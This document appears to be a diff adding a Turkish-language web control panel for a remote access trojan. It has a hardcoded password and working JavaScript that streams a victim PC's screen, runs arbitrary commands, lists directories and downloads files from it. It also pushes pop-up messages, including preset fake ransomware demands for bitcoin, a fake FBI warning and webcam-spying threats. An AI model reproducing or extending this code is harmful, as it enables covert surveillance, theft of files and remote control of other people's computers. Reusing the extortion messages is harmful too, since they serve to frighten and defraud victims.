@@ -1,0 +1,450 @@
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>RAT Kontrol Paneli</title>
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:#0a0a0a; font-family:'Courier New',monospace; padding:15px; color:#fff; min-height:100vh; display:flex; justify-content:center; align-items:center; }
+        .container { max-width:1100px; width:100%; background:#111; border-radius:16px; border:1px solid #00ff41; padding:20px; box-shadow:0 0 60px rgba(0,255,65,0.08); }
+        .header { text-align:center; padding-bottom:15px; border-bottom:1px solid #00ff41; margin-bottom:20px; }
+        .header h1 { color:#00ff41; font-size:24px; letter-spacing:2px; }
+        .header .sub { color:#ff8800; font-size:13px; margin-top:4px; }
+        .header .url-box { background:#1a1a1a; padding:8px; border-radius:6px; color:#ffaa00; font-size:13px; word-break:break-all; border:1px solid #333; margin-top:8px; display:inline-block; }
+        .key-area { background:#1a1a1a; border:1px solid #333; border-radius:8px; padding:15px; margin-bottom:20px; text-align:center; }
+        .key-area input { background:#0a0a0a; border:1px solid #00ff41; color:#fff; padding:10px 16px; border-radius:6px; width:250px; font-size:14px; outline:none; }
+        .key-area input:focus { border-color:#00ff41; box-shadow:0 0 15px rgba(0,255,65,0.2); }
+        .key-area button { background:#00ff41; color:#0a0a0a; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; font-size:14px; margin-left:8px; transition:0.2s; }
+        .key-area button:hover { background:#00cc33; }
+        .key-status { color:#ffaa00; font-size:12px; margin-top:6px; }
+        .tab-bar { display:flex; flex-wrap:wrap; gap:6px; margin-bottom:15px; }
+        .tab-bar button { background:#1a1a1a; color:#aaa; border:1px solid #333; padding:8px 16px; border-radius:6px; cursor:pointer; font-size:13px; transition:0.2s; }
+        .tab-bar button.active { background:#00ff41; color:#0a0a0a; border-color:#00ff41; font-weight:bold; }
+        .tab-bar button:hover { background:#2a2a2a; }
+        .tab-content { display:none; background:#0d0d0d; border-radius:10px; padding:15px; border:1px solid #222; }
+        .tab-content.active { display:block; }
+        .col-title { color:#00ff41; font-size:17px; border-bottom:1px solid #333; padding-bottom:6px; margin-bottom:12px; }
+        .screen-wrap { text-align:center; }
+        .screen-wrap img { width:100%; max-height:65vh; border-radius:8px; border:2px solid #00ff41; background:#000; }
+        .fps-info { color:#ffaa00; font-size:13px; margin-top:6px; }
+        .input-group { display:flex; flex-wrap:wrap; gap:8px; margin-top:10px; }
+        .input-group input { flex:1; min-width:160px; background:#0a0a0a; border:1px solid #333; color:#fff; padding:8px 12px; border-radius:6px; outline:none; }
+        .input-group input:focus { border-color:#00ff41; }
+        .input-group button { background:#00ff41; color:#0a0a0a; border:none; padding:8px 18px; border-radius:6px; font-weight:bold; cursor:pointer; transition:0.2s; }
+        .input-group button:hover { background:#00cc33; }
+        .input-group button.danger { background:#cc0000; color:#fff; }
+        .input-group button.danger:hover { background:#ff0000; }
+        .status { color:#ffaa00; font-size:12px; margin-top:6px; }
+        .result-box { background:#0a0a0a; border:1px solid #222; border-radius:6px; padding:10px; max-height:220px; overflow:auto; font-size:12px; white-space:pre-wrap; color:#aaa; margin-top:8px; }
+        .log-box { background:#0a0a0a; border:1px solid #222; border-radius:6px; padding:10px; max-height:160px; overflow:auto; font-size:11px; color:#666; margin-top:8px; }
+        .btn-grid { display:flex; flex-wrap:wrap; gap:6px; margin-top:8px; }
+        .btn-grid button { background:#1a1a1a; border:1px solid #444; color:#fff; padding:6px 14px; border-radius:6px; cursor:pointer; font-size:12px; transition:0.2s; }
+        .btn-grid button:hover { background:#2a2a2a; border-color:#00ff41; }
+        .btn-grid button.msg-btn { background:#4a0000; border-color:#880000; }
+        .btn-grid button.msg-btn:hover { background:#660000; border-color:#ff0000; }
+        .lock-icon { color:#ff4444; font-size:12px; margin-left:6px; }
+        .ip-input { background:#0a0a0a; border:1px solid #444; color:#fff; padding:8px 12px; border-radius:6px; width:180px; font-size:13px; outline:none; }
+        .ip-input:focus { border-color:#00ff41; }
+        @media (max-width:600px) { .container { padding:12px; } .key-area input { width:100%; margin-bottom:6px; } .key-area button { width:100%; margin-left:0; } }
+    </style>
+</head>
+<body>
+
+<div class="container" id="app">
+    <div class="header">
+        <h1>⬡ RAT KONTROL</h1>
+        <div class="sub">🔐 Şifre korumalı · Netlify ile erişim</div>
+        <div class="url-box" id="siteUrl">Yükleniyor...</div>
+    </div>
+
+    <!-- KEY GİRİŞ + IP AYARI -->
+    <div class="key-area">
+        <div style="display:flex;flex-wrap:wrap;justify-content:center;gap:8px;align-items:center;">
+            <input type="text" id="ipInput" class="ip-input" placeholder="PC IP (örn: 192.168.1.100)" value="" />
+            <input type="password" id="keyInput" placeholder="Şifreyi gir..." />
+            <button onclick="girisYap()">Giriş</button>
+        </div>
+        <div class="key-status" id="keyStatus">🔑 Varsayılan şifre: bartu123 | PC IP'sini girin</div>
+    </div>
+
+    <!-- TABLAR (Başlangıçta gizli) -->
+    <div id="panelContent" style="display:none;">
+        <div class="tab-bar">
+            <button class="active" onclick="showTab('ekran',this)">📺 Ekran</button>
+            <button onclick="showTab('mesaj',this)">💬 Mesaj</button>
+            <button onclick="showTab('komut',this)">⚡ Komut</button>
+            <button onclick="showTab('dosya',this)">📂 Dosya</button>
+            <button onclick="showTab('bilgi',this)">📊 Bilgi</button>
+            <button onclick="showTab('hazir',this)">📨 Hazır Mesaj</button>
+            <button onclick="showTab('log',this)">📜 Log</button>
+        </div>
+
+        <!-- EKRAN -->
+        <div id="tab-ekran" class="tab-content active">
+            <div class="col-title">📺 Canlı Ekran Yayını</div>
+            <div class="screen-wrap">
+                <img id="screenImg" src="" alt="Yayın yükleniyor..." />
+                <div class="fps-info">FPS: <span id="fpsCounter">0</span></div>
+            </div>
+            <div class="input-group">
+                <input type="number" id="qualityInput" value="50" min="10" max="95" />
+                <button onclick="setQuality()">Kalite</button>
+                <button onclick="refreshScreen()">🔄 Yenile</button>
+            </div>
+            <div class="status" id="qualityStatus">Kalite: 50</div>
+        </div>
+
+        <!-- MESAJ -->
+        <div id="tab-mesaj" class="tab-content">
+            <div class="col-title">💬 Mesaj Gönder</div>
+            <div class="input-group">
+                <input type="text" id="msgInput" placeholder="PC'de gösterilecek mesaj..." />
+                <button onclick="sendMsg()">Gönder</button>
+            </div>
+            <div class="status" id="msgStatus">Hazır</div>
+            <button onclick="sendBeep()" style="margin-top:8px;padding:6px 14px;background:#ff8800;border:none;border-radius:6px;color:#000;font-weight:bold;">🔊 Sesli Uyarı</button>
+        </div>
+
+        <!-- KOMUT -->
+        <div id="tab-komut" class="tab-content">
+            <div class="col-title">⚡ Komut Çalıştır</div>
+            <div class="input-group">
+                <input type="text" id="cmdInput" placeholder="Örn: dir / ipconfig / whoami" />
+                <button onclick="runCmd()">Çalıştır</button>
+            </div>
+            <div class="status" id="cmdStatus">Hazır</div>
+            <div class="result-box" id="cmdResult">[Çıktı burada görünecek]</div>
+        </div>
+
+        <!-- DOSYA -->
+        <div id="tab-dosya" class="tab-content">
+            <div class="col-title">📂 Dosya İşlemleri</div>
+            <div class="input-group">
+                <input type="text" id="dirInput" value="." placeholder="Dizin yolu..." />
+                <button onclick="listDir()">Listele</button>
+            </div>
+            <div class="result-box" id="dirResult">[Dosya listesi burada]</div>
+            <div class="input-group" style="margin-top:10px;">
+                <input type="text" id="dlInput" placeholder="Dosya yolu..." />
+                <button onclick="downloadFile()">⬇ İndir</button>
+            </div>
+            <div class="status" id="dlStatus">Hazır</div>
+        </div>
+
+        <!-- BİLGİ -->
+        <div id="tab-bilgi" class="tab-content">
+            <div class="col-title">📊 Sistem Bilgisi</div>
+            <button onclick="getSysInfo()" style="padding:8px 20px;background:#00ff41;border:none;border-radius:6px;color:#000;font-weight:bold;">Bilgi Al</button>
+            <div class="result-box" id="sysResult" style="margin-top:10px;">[Sistem bilgisi burada]</div>
+        </div>
+
+        <!-- HAZIR MESAJ -->
+        <div id="tab-hazir" class="tab-content">
+            <div class="col-title">📨 Hazır Korkutucu Mesajlar</div>
+            <p style="color:#888;font-size:13px;">Tek tıkla PC'de mesaj kutusu açılır.</p>
+            <div class="btn-grid">
+                <button class="msg-btn" onclick="sendHazir('fidye')">💀 Fidye</button>
+                <button class="msg-btn" onclick="sendHazir('virus')">🦠 Virüs</button>
+                <button class="msg-btn" onclick="sendHazir('silindi')">🗑️ Silindi</button>
+                <button class="msg-btn" onclick="sendHazir('casus')">👁️ Casus</button>
+                <button class="msg-btn" onclick="sendHazir('format')">💥 Format</button>
+                <button class="msg-btn" onclick="sendHazir('kamera')">📸 Kamera</button>
+                <button class="msg-btn" onclick="sendHazir('fbi')">👮 FBI</button>
+                <button class="msg-btn" onclick="sendHazir('nuke')">☢️ Nükleer</button>
+                <button class="msg-btn" onclick="sendHazir('kimlik')">🆔 Kimlik</button>
+                <button class="msg-btn" onclick="sendHazir('karanlik')">🌑 Karanlık</button>
+            </div>
+            <div class="status" id="hazirStatus">Hazır</div>
+        </div>
+
+        <!-- LOG -->
+        <div id="tab-log" class="tab-content">
+            <div class="col-title">📜 Olay Logları</div>
+            <button onclick="getLogs()" style="padding:8px 20px;background:#00ff41;border:none;border-radius:6px;color:#000;font-weight:bold;">Logları Göster</button>
+            <div class="log-box" id="logResult" style="margin-top:10px;">[Loglar burada]</div>
+        </div>
+    </div>
+</div>
+
+<script>
+    // =========== KONFIGÜRASYON ===========
+    const SIFRE = "bartu123";
+    let SUNUCU_IP = "";
+    let SUNUCU_PORT = 8080;
+    let SIFRE_DOGRU = false;
+
+    // =========== BAŞLANGIÇ ===========
+    window.onload = function() {
+        document.getElementById('siteUrl').textContent = window.location.href;
+        // Önceki IP'yi localStorage'dan al
+        const savedIp = localStorage.getItem('rat_server_ip');
+        if (savedIp) {
+            document.getElementById('ipInput').value = savedIp;
+            SUNUCU_IP = savedIp;
+        }
+    };
+
+    // =========== ŞİFRE GİRİŞİ ===========
+    function girisYap() {
+        const girilen = document.getElementById('keyInput').value.trim();
+        const ip = document.getElementById('ipInput').value.trim();
+        const status = document.getElementById('keyStatus');
+
+        if (!ip) {
+            status.textContent = '❌ Lütfen PC IP adresini girin!';
+            status.style.color = '#ff4444';
+            return;
+        }
+
+        if (girilen !== SIFRE) {
+            status.textContent = '❌ Hatalı şifre! Tekrar dene.';
+            status.style.color = '#ff4444';
+            document.getElementById('panelContent').style.display = 'none';
+            return;
+        }
+
+        // IP'yi kaydet
+        SUNUCU_IP = ip;
+        localStorage.setItem('rat_server_ip', ip);
+
+        SIFRE_DOGRU = true;
+        status.textContent = '✅ Giriş başarılı! IP: ' + ip;
+        status.style.color = '#00ff41';
+        document.getElementById('panelContent').style.display = 'block';
+        document.getElementById('keyInput').value = '';
+
+        // Otomatik ekran yenileme başlat
+        refreshScreen();
+        setInterval(refreshScreen, 3000);
+        listDir();
+    }
+
+    document.getElementById('keyInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') girisYap();
+    });
+    document.getElementById('ipInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') girisYap();
+    });
+
+    // =========== TAB YÖNETİMİ ===========
+    function showTab(id, btn) {
+        if (!SIFRE_DOGRU) return;
+        document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+        document.querySelectorAll('.tab-bar button').forEach(el => el.classList.remove('active'));
+        document.getElementById('tab-' + id).classList.add('active');
+        if (btn) btn.classList.add('active');
+    }
+
+    // =========== BASE URL ===========
+    function getBaseUrl() {
+        if (SUNUCU_IP) {
+            return `http://${SUNUCU_IP}:${SUNUCU_PORT}`;
+        }
+        return `http://localhost:${SUNUCU_PORT}`;
+    }
+
+    // =========== EKRAN YAYINI ===========
+    function refreshScreen() {
+        if (!SIFRE_DOGRU) return;
+        const img = document.getElementById('screenImg');
+        const base = getBaseUrl();
+        img.src = base + '/stream?t=' + Date.now();
+        img.onerror = function() {
+            // Hata durumunda tekrar dene
+            setTimeout(refreshScreen, 3000);
+        };
+    }
+
+    let frameCount = 0;
+    setInterval(() => {
+        document.getElementById('fpsCounter').textContent = frameCount;
+        frameCount = 0;
+    }, 1000);
+    document.getElementById('screenImg').onload = function() {
+        frameCount++;
+    };
+
+    // =========== KALİTE AYARI ===========
+    function setQuality() {
+        if (!SIFRE_DOGRU) return;
+        const q = parseInt(document.getElementById('qualityInput').value) || 50;
+        const status = document.getElementById('qualityStatus');
+        fetch(getBaseUrl() + '/setquality?q=' + q)
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    status.textContent = 'Kalite: ' + data.quality;
+                }
+            })
+            .catch(() => { status.textContent = 'Kalite ayarlanamadı'; });
+    }
+
+    // =========== MESAJ GÖNDER ===========
+    function sendMsg() {
+        if (!SIFRE_DOGRU) return;
+        const input = document.getElementById('msgInput');
+        const status = document.getElementById('msgStatus');
+        const msg = input.value.trim();
+        if (!msg) { status.textContent = 'Mesaj boş!'; return; }
+        status.textContent = 'Gönderiliyor...';
+        fetch(getBaseUrl() + '/sendmsg?msg=' + encodeURIComponent(msg))
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    status.textContent = '✅ Gönderildi!';
+                    input.value = '';
+                } else {
+                    status.textContent = 'Hata: ' + data.msg;
+                }
+            })
+            .catch(() => { status.textContent = '❌ Bağlantı hatası! Sunucu çalışıyor mu?'; });
+    }
+
+    document.getElementById('msgInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') sendMsg();
+    });
+
+    function sendBeep() {
+        if (!SIFRE_DOGRU) return;
+        fetch(getBaseUrl() + '/sendmsg?msg=!BEEP!')
+            .then(() => { document.getElementById('msgStatus').textContent = '🔊 Ses çalındı'; })
+            .catch(() => { document.getElementById('msgStatus').textContent = '❌ Hata'; });
+    }
+
+    // =========== KOMUT ÇALIŞTIR ===========
+    function runCmd() {
+        if (!SIFRE_DOGRU) return;
+        const input = document.getElementById('cmdInput');
+        const status = document.getElementById('cmdStatus');
+        const result = document.getElementById('cmdResult');
+        const cmd = input.value.trim();
+        if (!cmd) { status.textContent = 'Komut boş!'; return; }
+        status.textContent = 'Çalıştırılıyor...';
+        result.textContent = 'Bekleniyor...';
+        fetch(getBaseUrl() + '/run?cmd=' + encodeURIComponent(cmd))
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    result.textContent = data.result || '[Çıktı yok]';
+                    status.textContent = '✅ Tamamlandı';
+                } else {
+                    result.textContent = 'Hata: ' + data.msg;
+                    status.textContent = '❌ Hata';
+                }
+            })
+            .catch(() => { result.textContent = 'Bağlantı hatası!'; status.textContent = '❌ Hata'; });
+    }
+
+    document.getElementById('cmdInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') runCmd();
+    });
+
+    // =========== DOSYA İŞLEMLERİ ===========
+    function listDir() {
+        if (!SIFRE_DOGRU) return;
+        const input = document.getElementById('dirInput');
+        const result = document.getElementById('dirResult');
+        const dir = input.value.trim() || '.';
+        result.textContent = 'Yükleniyor...';
+        fetch(getBaseUrl() + '/listdir?dir=' + encodeURIComponent(dir))
+            .then(r => r.text())
+            .then(data => { result.textContent = data; })
+            .catch(() => { result.textContent = 'Bağlantı hatası! Sunucu çalışıyor mu?'; });
+    }
+
+    document.getElementById('dirInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') listDir();
+    });
+
+    function downloadFile() {
+        if (!SIFRE_DOGRU) return;
+        const input = document.getElementById('dlInput');
+        const status = document.getElementById('dlStatus');
+        const file = input.value.trim();
+        if (!file) { status.textContent = 'Dosya yolu boş!'; return; }
+        status.textContent = 'İndiriliyor...';
+        fetch(getBaseUrl() + '/download?file=' + encodeURIComponent(file))
+            .then(r => {
+                if (r.status === 200) return r.blob();
+                throw new Error('Dosya bulunamadı');
+            })
+            .then(blob => {
+                const url = URL.createObjectURL(blob);
+                const a = document.createElement('a');
+                a.href = url;
+                let filename = file.split('/').pop().split('\\').pop();
+                a.download = filename;
+                a.click();
+                URL.revokeObjectURL(url);
+                status.textContent = '✅ İndirildi!';
+            })
+            .catch(() => { status.textContent = '❌ Dosya bulunamadı veya hata!'; });
+    }
+
+    document.getElementById('dlInput').addEventListener('keypress', function(e) {
+        if (e.key === 'Enter') downloadFile();
+    });
+
+    // =========== SİSTEM BİLGİSİ ===========
+    function getSysInfo() {
+        if (!SIFRE_DOGRU) return;
+        const result = document.getElementById('sysResult');
+        result.textContent = 'Yükleniyor...';
+        fetch(getBaseUrl() + '/sysinfo')
+            .then(r => r.text())
+            .then(data => { result.textContent = data; })
+            .catch(() => { result.textContent = 'Bağlantı hatası!'; });
+    }
+
+    // =========== LOGLAR ===========
+    function getLogs() {
+        if (!SIFRE_DOGRU) return;
+        const result = document.getElementById('logResult');
+        result.textContent = 'Yükleniyor...';
+        fetch(getBaseUrl() + '/logs')
+            .then(r => r.text())
+            .then(data => { result.textContent = data; })
+            .catch(() => { result.textContent = 'Bağlantı hatası!'; });
+    }
+
+    // =========== HAZIR MESAJLAR ===========
+    const mesajlar = {
+        'fidye': 'TÜM DOSYALARINIZ ŞİFRELENİYOR!\n\nŞifre Çözme Anahtarı: 48 saat içinde silinecek\n\nSistemdeki tüm verileriniz kalıcı olarak kaybolacak.\n\nTEK ÇÖZÜM: 500 BTC gönderin (yaklaşık 15.000.000 TL)\n\nÖdeme yapılmazsa verileriniz İMHA EDİLECEK!',
+        'virus': 'KRİTİK UYARI!\n\nSisteminizde TROJAN.FUD.2026 tespit edildi!\n\nTüm dosyalarınız şifreleniyor... %47 tamamlandı.\n\nSistem kapatılırsa veriler KALICI OLARAK yok olur.\n\nHemen 0.5 BTC gönderin (yaklaşık 1.500.000 TL)\n\nÖdeme yapılmazsa tüm veriler satılacak!',
+        'silindi': 'DİKKAT!\n\nC: sürücüsündeki tüm dosyalar siliniyor...\n\nKalan dosya: 0\n\nGeri dönüşüm kutusu temizlendi.\n\nVeri kurtarma mümkün DEĞİL.\n\nBu işlem geri alınamaz. İyi günler.',
+        'casus': 'SİZİ İZLİYORUZ!\n\nWeb kameranız AKTİF edildi.\n\nMikrofon kaydediyor.\n\nTarayıcı geçmişiniz kopyalandı.\n\nWhatsApp mesajlarınız okundu.\n\nKonumunuz tespit edildi.\n\nSizi 24 saat boyunca takip edeceğiz.',
+        'format': '!!! FORMAT ATILIYOR !!!\n\nDiskteki tüm bölümler temizleniyor...\n\nMBR yeniden yazılıyor...\n\nBoot sektörü siliniyor...\n\nİşlem tamamlandığında sistem çökecek.\n\nİyi şanslar!',
+        'kamera': 'KAMERA ERİŞİMİ\n\nBilgisayarınızdaki kameraya bağlanıldı.\n\nŞu anda sizi görüntülüyorum.\n\nGüle güle gülümseyin! 📸\n\nFotoğrafınız çekildi ve yayınlanacak.',
+        'fbi': 'FBI UYARISI\n\nIP adresiniz tespit edildi.\n\nYasadışı içerik barındırdığınız tespit edildi.\n\nSoruşturma başlatıldı.\n\nEn kısa sürede kapınız çalınacak.\n\nCeza: 15-20 yıl hapis.',
+        'nuke': '☢️ NÜKLEER UYARI ☢️\n\nKritik seviyede radyasyon tespit edildi!\n\nSistem otomatik olarak kapanıyor...\n\n3... 2... 1...\n\n(Aslında hiçbir şey olmadı, ama panik yaptınız mı?)',
+        'kimlik': 'KİMLİK HIRSIZLIĞI\n\nTüm kimlik bilgileriniz çalındı.\n\nTCKN, adres, telefon, banka hesapları.\n\nDarknet\'te satışa çıkarıldı.\n\nFiyat: 200$\n\nHemen 0.1 BTC gönderin yoksa herkes öğrenecek.',
+        'karanlik': 'KARANLIK AĞ\n\nDeep Web bağlantısı kuruldu.\n\nKimliğiniz gizlendi.\n\nArtık geri dönüş yok.\n\nSistem karartıldı.\n\nSizi bulamayacaklar.\n\nYa da belki de sadece bir mesaj...'
+    };
+
+    function sendHazir(tur) {
+        if (!SIFRE_DOGRU) return;
+        const status = document.getElementById('hazirStatus');
+        const msg = mesajlar[tur];
+        if (!msg) { status.textContent = 'Mesaj bulunamadı!'; return; }
+        status.textContent = 'Gönderiliyor...';
+        fetch(getBaseUrl() + '/sendmsg?msg=' + encodeURIComponent(msg))
+            .then(r => r.json())
+            .then(data => {
+                if (data.status === 'ok') {
+                    status.textContent = '✅ Mesaj gönderildi!';
+                } else {
+                    status.textContent = 'Hata: ' + data.msg;
+                }
+            })
+            .catch(() => { status.textContent = '❌ Bağlantı hatası!'; });
+    }
+
+    // Giriş yapıldıktan sonra otomatik listeleme
+    setTimeout(() => {
+        if (SIFRE_DOGRU) listDir();
+    }, 1500);
+</script>
+
+</body>
+</html>
